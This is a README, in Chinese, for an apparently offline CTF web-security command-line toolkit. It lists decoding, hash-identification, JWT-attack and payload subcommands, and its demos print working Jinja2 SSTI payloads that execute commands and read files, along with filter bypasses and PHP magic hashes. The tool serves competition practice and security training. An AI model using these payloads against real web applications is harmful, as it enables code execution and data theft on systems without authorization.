# Yang-Web 🔧

> 离线 CTF Web 瑞士军刀 — 零依赖的命令行工具箱

[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Zero Dependencies](https://img.shields.io/badge/dependencies-0-green.svg)]()

## ✨ 亮点

- **完全离线** — 零 pip 依赖，纯 Python 标准库
- **智能解码** — 自动检测 14 种编码格式，递归链式解码到明文
- **Payload 大全** — 内置 SSTI/SQLi/LFI/SSRF/XSS/RCE/PHP 全部 Payload
- **JWT 攻击** — 解析→分析→None 攻击→弱密钥爆破，一条命令搞定

## 🚀 快速开始

```bash
# 安装
pip install yang-web

# 或直接从 GitHub
pip install git+https://github.com/XiaoYang/yang-web.git

# 使用
yang-web decode "ZmxhZ3t0ZXN0fQ=="
```

## 📖 12 个子命令

| 命令 | 功能 | 示例 |
|------|------|------|
| `decode` | 智能链式解码 | `yang-web decode "NTI2Z..."` |
| `encode` | 文本编码 | `yang-web encode base64 "flag"` |
| `ssti` | SSTI Payload | `yang-web ssti --exploit --engine Jinja2` |
| `sqli` | SQL 注入 | `yang-web sqli --db MySQL` |
| `lfi` | 文件包含 | `yang-web lfi --traversal` |
| `ssrf` | SSRF Payload | `yang-web ssrf --cloud aws` |
| `xss` | XSS Payload | `yang-web xss --detect` |
| `rce` | 命令注入 | `yang-web rce --shell bash` |
| `php` | PHP 技巧 | `yang-web php --magic` |
| `hashid` | Hash 识别 | `yang-web hashid "e10adc3..."` |
| `jwt` | JWT 攻击 | `yang-web jwt "eyJ..."` |
| `scan` | 目录扫描 | `yang-web scan dir --search flag` |

## 🎯 核心功能演示

### 智能链式解码
```bash
$ yang-web decode "NTI2ZjYyNmY3NDIwNjU2MTczNzk="
📋 输入: NTI2ZjYyNmY3NDIwNjU2MTczNzk=
🔓 智能链式解码:
  Step 1: base64 → 526f626f742065617379
  Step 2: base16 → Robot easy
✅ 最终结果: Robot easy
```

### Hash 类型识别
```bash
$ yang-web hashid "e10adc3949ba59abbe56e057f20f883e"
🔍 长度: 32 字符
📊 可能的算法: MD5, NTLM, MD4 等 6 种匹配
```

### SSTI 利用 Payload
```bash
$ yang-web ssti --exploit --engine "Jinja2 (Flask)"
• RCE - subprocess.Popen: {{ cycler.__init__.__globals__.os.popen('id').read() }}
• RCE - __subclasses__ 链: {{ ''.__class__.__mro__[1].__subclasses__()... }}
• 文件读取: {{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}
• Bypass 过滤: {{ ()|attr('__cla'+'ss__') }} ...
```

### PHP Magic Hash
```bash
$ yang-web php --magic
✨ MD5 (0e...) Magic Hash:
  • 240610708  • QNKCDZO  • PJNPDWY
✨ SHA-1 (0e...) Magic Hash:
  • aaroZmOk  • aaK1STfY  • aaO8zKZF
```

## 📦 离线使用

拷贝到 U 盘/比赛机器，无需任何网络：

```bash
git clone https://github.com/XiaoYang/yang-web.git
cd yang-web
python -m yang_web
```

## 🤝 贡献

欢迎提交 Issue 和 PR！常见贡献方向：
- 更多 Payload
- 新的编码格式支持
- 词库扩充
- Bug 修复

## 📄 License

MIT License — 详见 [LICENSE](LICENSE)
